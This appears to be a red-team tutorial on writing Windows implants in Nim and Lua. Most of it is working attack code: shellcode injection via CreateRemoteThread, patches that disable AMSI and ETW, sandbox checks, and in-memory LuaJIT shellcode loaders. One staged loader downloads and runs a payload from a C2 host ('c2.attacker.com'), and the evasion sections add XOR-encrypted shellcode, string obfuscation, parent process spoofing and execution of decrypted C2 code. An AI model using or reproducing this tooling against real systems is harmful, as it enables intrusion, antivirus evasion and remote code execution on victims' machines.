Why Nim & Lua for Offensive Security

Language choice is a decisive evasion factor in modern red team operations. AV/EDR vendors maintain detection signatures primarily trained on C, C++, and PowerShell malware -- the languages used by the vast majority of commodity malware and commodity red team tooling. Nim and Lua represent a fundamentally different attack surface that most vendor signatures have not matured against, producing significantly lower initial detection rates while offering the full systems-level access needed for professional offensive operations.

Beyond evasion, both languages have genuine technical advantages: Nim compiles to native binaries with a minimal runtime, supports cross-compilation from Linux to Windows PE executables, and has clean FFI for Windows API calls. Lua is embeddable in virtually any host application, scriptable at runtime (no recompilation for payload changes), and trivially obfuscated. Combined, they give red team operators two distinct deployment models -- compiled native binaries (Nim) and interpreted runtime-flexible scripts (Lua) -- covering different target environments and operational requirements.

Nim -- Language Setup & Windows FFI

Nim is a statically typed compiled language that transpiles to C before compiling to native machine code. This transpilation creates a significant evasion advantage -- the resulting PE binary contains C-derived assembly that lacks Nim-specific byte signatures and has a radically different import table profile compared to commodity malware. Nim's FFI (Foreign Function Interface) allows direct access to the Windows API through winim -- the comprehensive Windows API binding library that covers everything from basic memory operations to kernel callbacks.

# Install Nim via choosenim (recommended) curl https://nim-lang.org/choosenim/init.sh -sSf | sh choosenim stable nim --version # Cross-compile for Windows from Linux sudo apt install mingw-w64 # MinGW cross-compiler # Install winim (Windows API bindings -- essential) nimble install winim # Compile Nim to Windows PE from Linux nim c -d:mingw --cpu:amd64 payload.nim # -d:mingw = cross-compile for Windows # --cpu:amd64 = 64-bit target # Compile with OPSEC-friendly flags nim c -d:mingw -d:strip -d:danger --opt:speed --cpu:amd64 -d:release --app:gui payload.nim # --app:gui = no console window spawned (stealth) # -d:danger = disable all safety checks (smaller binary) # -d:strip = strip debug symbols
# Nim Windows API -- direct WinAPI calls via winim import winim/lean # Lean = minimal winim imports (smaller binary) # MessageBox -- basic WinAPI call test discard MessageBox(0, "Hello", "WinAPI", MB_OK) # VirtualAlloc -- allocate RWX memory (for shellcode staging) var buf = VirtualAlloc( nil, 4096, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE ) # OpenProcess -- get handle to target process proc getHandle(pid: DWORD): HANDLE = return OpenProcess( PROCESS_ALL_ACCESS, false, pid ) # CreateRemoteThread -- remote execution var tid: DWORD var tHandle = CreateRemoteThread( hProcess, # target process handle nil, 0, cast[LPTHREAD_START_ROUTINE](remoteAddr), nil, 0, addr tid ) # GetProcAddress -- dynamic API resolution (bypass import table scanning) proc dynFunc(dll, funcName: string): FARPROC = let hDll = LoadLibraryA(dll) return GetProcAddress(hDll, funcName)

Nim -- Shellcode Injection & Process Hollowing

Nim's ability to call Windows API functions directly through winim makes it ideal for implementing classic and advanced process injection techniques. Classic shellcode injection (VirtualAllocEx → WriteProcessMemory → CreateRemoteThread) is straightforward in Nim and produces low AV detection. Process hollowing -- creating a legitimate process suspended then replacing its memory with shellcode before resuming -- is more sophisticated and provides stronger evasion. The key evasion advantage in Nim is that the resulting binary's import table looks unusual to signature-based scanners compared to standard C++ malware.

Nim -- AMSI Bypass & AV Evasion

AV evasion in Nim operates at multiple layers: static evasion (how the binary looks on disk -- import table, strings, entropy, byte signatures), dynamic evasion (how the binary behaves at runtime -- AMSI patching, ETW disabling, sandbox detection), and memory evasion (how the injected shellcode looks in memory -- encryption, sleep masking, module stomping). Each layer must be addressed for a robust red team implant. Nim's advantage is at the static layer -- the transpiled C code produces assemblies that AV signature engines have not broadly profiled.

import winim/lean, winim/core # AMSI BYPASS -- patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN # This disables AMSI scanning for the current process lifetime proc patchAMSI(): bool = let hAmsi = LoadLibraryA("amsi.dll") pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer") if pAmsi == nil: return false # Patch bytes: mov eax, 0x80070057; ret (returns error = AMSI_RESULT_CLEAN) var patch: array[6, byte] = [ 0xB8'u8, 0x57'u8, 0x00'u8, 0x07'u8, 0x80'u8, 0xC3'u8] var oldProtect: DWORD VirtualProtect(pAmsi, patch.len, PAGE_EXECUTE_READWRITE, addr oldProtect) copyMem(pAmsi, addr patch[0], patch.len) VirtualProtect(pAmsi, patch.len, oldProtect, addr oldProtect) return true # ETW DISABLE -- patch EtwEventWrite to return immediately # Prevents event tracing from logging suspicious API calls proc disableETW(): bool = let hNtdll = GetModuleHandleA("ntdll.dll") pEtw = GetProcAddress(hNtdll, "EtwEventWrite") if pEtw == nil: return false var patch: array[1, byte] = [0xC3'u8] # ret -- instant return var oldProt: DWORD VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, addr oldProt) copyMem(pEtw, addr patch[0], 1) VirtualProtect(pEtw, 1, oldProt, addr oldProt) return true # SANDBOX DETECTION -- bail if running in sandbox proc sandboxCheck(): bool = # Check username -- common sandbox accounts var buf: array[256, CHAR] var sz: DWORD = 256 GetComputerNameA(addr buf[0], addr sz) let hostname = $cast[cstring](addr buf[0]) let badHosts = ["SANDBOX", "CUCKOO", "MALTEST", "VIRUS"] for h in badHosts: if hostname.toUpper.contains(h): return true # Check RAM -- sandboxes often have low RAM var memStatus: MEMORYSTATUSEX memStatus.dwLength = sizeof(memStatus).DWORD GlobalMemoryStatusEx(addr memStatus) if memStatus.ullTotalPhys < (2 * 1024 * 1024 * 1024): # < 2GB RAM return true return false

Lua -- Language Setup & C API Bridge

Lua is a lightweight, embeddable scripting language designed to be hosted inside a C application. This design is what makes it uniquely powerful for offensive operations -- Lua scripts can be delivered and modified at runtime without recompilation, embedded inside seemingly legitimate applications (many games, enterprise tools, and IoT devices embed Lua), and executed entirely in memory without writing a script file to disk. LuaJIT (the Just-In-Time compiled Lua implementation) adds FFI capabilities that allow calling C functions and Windows API directly from Lua scripts -- closing the gap with Nim for Windows API access.

# Install Lua and LuaJIT on Linux sudo apt install lua5.4 luajit luajit --version # Run a Lua script lua5.4 payload.lua luajit payload.lua # JIT-compiled -- faster + FFI support # ── LUAJIT FFI -- CALL WINDOWS API DIRECTLY ────────── local ffi = require("ffi") # Declare Windows API prototypes ffi.cdef[[ void* VirtualAlloc(void* lpAddress, size_t dwSize, unsigned long flAllocationType, unsigned long flProtect); int VirtualProtect(void* lpAddress, size_t dwSize, unsigned long flNewProtect, unsigned long* lpflOldProtect); void* CreateThread(void* lpThreadAttr, size_t dwStackSize, void* lpStartAddress, void* lpParam, unsigned long dwCreationFlags, unsigned long* lpThreadId); unsigned long WaitForSingleObject(void* hHandle, unsigned long dwMilliseconds); void* LoadLibraryA(const char* lpLibFileName); void* GetProcAddress(void* hModule, const char* lpProcName); ]] # Load kernel32 for memory operations local k32 = ffi.load("kernel32") # Basic MessageBox via FFI local user32 = ffi.load("user32") ffi.cdef[[ int MessageBoxA(void*, const char*, const char*, int); ]] user32.MessageBoxA(nil, "Test", "LuaJIT FFI", 0)

Lua -- Shellcode Loader & C2 Communication

Lua's runtime flexibility enables two powerful offensive patterns not available with compiled languages. First, in-memory shellcode execution via LuaJIT FFI -- shellcode bytes are stored as a Lua string, allocated in executable memory via VirtualAlloc, and executed by casting the memory address to a function pointer. Second, network-retrieved payloads -- the Lua script connects to a C2 server, downloads shellcode bytes or additional Lua code at runtime, and executes them in memory without ever writing a file to disk. This staged approach dramatically reduces the static signature of the dropper.

# LuaJIT shellcode loader -- full in-memory execution # No files written to disk; shellcode runs in VirtualAlloc'd RWX region local ffi = require("ffi") ffi.cdef[[ void* VirtualAlloc(void* addr, size_t size, unsigned long atype, unsigned long protect); unsigned long WaitForSingleObject(void* handle, unsigned long ms); void* CreateThread(void* attr, size_t stack, void* start, void* param, unsigned long flags, unsigned long* tid); ]] # XOR-decoded shellcode (msfvenom / custom -- see evasion section) local shellcode = "üHäð" # ... (truncated) local sc_len = #shellcode # Constants local MEM_COMMIT = 0x1000 local MEM_RESERVE = 0x2000 local PAGE_RWX = 0x40 local INFINITE = 0xFFFFFFFF # Allocate RWX memory local mem = ffi.C.VirtualAlloc( nil, sc_len, MEM_COMMIT + MEM_RESERVE, PAGE_RWX ) if mem == nil then return end # Copy shellcode bytes into allocated memory ffi.copy(mem, shellcode, sc_len) # Cast memory address to function pointer and call via thread local func_t = ffi.typeof("void(*)(void)") local func = ffi.cast(func_t, mem) local tid = ffi.new("unsigned long[1]") local th = ffi.C.CreateThread(nil, 0, func, nil, 0, tid) ffi.C.WaitForSingleObject(th, INFINITE)
# Staged Lua loader -- retrieves shellcode from C2 over HTTP # No shellcode stored in dropper; downloaded at runtime # Uses luasocket library: luarocks install luasocket local ffi = require("ffi") local http = require("socket.http") local ltn12 = require("ltn12") ffi.cdef[[ void* VirtualAlloc(void*, size_t, unsigned long, unsigned long); void* CreateThread(void*, size_t, void*, void*, unsigned long, unsigned long*); unsigned long WaitForSingleObject(void*, unsigned long); ]] local function fetchShellcode(c2_url) local body = {} local ok, code = http.request({ url = c2_url, sink = ltn12.sink.table(body), method = "GET", headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64)"} }) if code ~= 200 then return nil end return table.concat(body) end local function execInMemory(sc) local mem = ffi.C.VirtualAlloc( nil, #sc, 0x3000, 0x40) # MEM_COMMIT|RESERVE, PAGE_RWX if mem == nil then return end ffi.copy(mem, sc, #sc) local f = ffi.cast("void(*)(void)", mem) local tid = ffi.new("unsigned long[1]") local th = ffi.C.CreateThread(nil, 0, f, nil, 0, tid) ffi.C.WaitForSingleObject(th, 0xFFFFFFFF) end local sc = fetchShellcode("http://c2.attacker.com/stage2.bin") if sc then execInMemory(sc) end

Evasion Techniques -- Both Languages

Effective evasion combines multiple independent layers -- no single technique is sufficient against modern EDR. The standard evasion stack for Nim/Lua payloads covers: shellcode encryption (XOR, AES, RC4 -- prevent static shellcode signature matches), string obfuscation (API names as encrypted or split strings -- bypass import table analysis and string scanning), sleep + timing checks (detect accelerated sandbox execution), direct syscalls (bypass userland API hooks placed by EDR), and binary customisation (custom PE sections, stripped metadata, code signing).

import winim/lean, times, os # XOR encrypt/decrypt shellcode at runtime # Encrypted bytes stored in binary -- decrypted in memory only proc xorCrypt(data: var seq[byte], key: byte) = for i in 0..high(data): data[i] = data[i] xor key # Encrypted shellcode (pre-XOR with key 0x41) var encShellcode = @[0xBD'u8, 0x09'u8, 0xC2'u8, ...] # encrypted bytes xorCrypt(encShellcode, 0x41) # decrypt in-memory at runtime # SLEEP-BASED SANDBOX DETECTION # Sandboxes fast-forward sleep calls -- detect via timing discrepancy proc sleepCheck(): bool = let before = epochTime() sleep(10000) # sleep 10 seconds let elapsed = epochTime() - before return elapsed < 8.0 # < 8s elapsed = sandbox (fast-forwarded) # STRING OBFUSCATION -- store sensitive strings encrypted proc deobfStr(s: string): string = result = s for i in 0..high(result): result[i] = chr(ord(result[i]) - 1) # shift-1 deobfuscation # Store as: deobfStr("bntjcbttf") = "amsibase" -- not "amsi.dll" in strings let amsiLib = deobfStr("bntj/eme") # "amsi.dll" # PARENT PROCESS SPOOFING -- appear to be spawned by explorer.exe import winim/lean var si: STARTUPINFOEX pi: PROCESS_INFORMATION parentHandle = OpenProcess( PROCESS_ALL_ACCESS, false, explorerPid) # explorer PID # Update PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in lpAttributeList # Then CreateProcess with EXTENDED_STARTUPINFO_PRESENT flag
# Lua obfuscation -- multiple techniques # TECHNIQUE 1: Byte-array string construction (bypasses string scanning) local function fromBytes(...) return string.char(...) end # "VirtualAlloc" as bytes -- never appears as literal string local fn_name = fromBytes(86,105,114,116,117,97,108,65,108,108,111,99) # TECHNIQUE 2: XOR decryption of payload code at runtime local function xorDecrypt(data, key) local result = {} for i = 1, #data do result[i] = string.char( data:byte(i) ~ key:byte(((i-1) % #key) + 1) ) end return table.concat(result) end # TECHNIQUE 3: load() -- execute Lua code from string at runtime # Payload code retrieved from C2, decrypted, then compiled + run in memory local encrypted_code = "..." # from C2 or embedded local decrypted_code = xorDecrypt(encrypted_code, "KEY123") local fn, err = load(decrypted_code) # compile Lua string to bytecode if fn then fn() end # execute in memory # TECHNIQUE 4: sandbox detection via Lua timing local t0 = os.clock() os.execute("ping -n 3 127.0.0.1 > nul") # 3-second delay local elapsed = os.clock() - t0 if elapsed < 2.5 then os.exit(0) # sandbox detected -- exit cleanly end
